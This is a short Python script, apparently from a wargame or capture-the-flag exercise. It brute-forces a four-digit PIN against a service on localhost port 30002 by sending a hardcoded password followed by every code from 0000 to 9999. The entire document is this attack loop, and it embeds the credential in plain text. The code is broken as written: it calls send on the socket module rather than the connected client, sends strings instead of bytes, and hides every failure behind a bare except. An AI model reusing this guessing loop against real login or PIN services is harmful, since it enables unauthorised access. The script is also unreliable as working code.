import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("localhost", 30002))

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "

for i in range(10000):
    code = str(format(i, '04d'))
    try:
        socket.send(password + code)
    except:
        print("error")
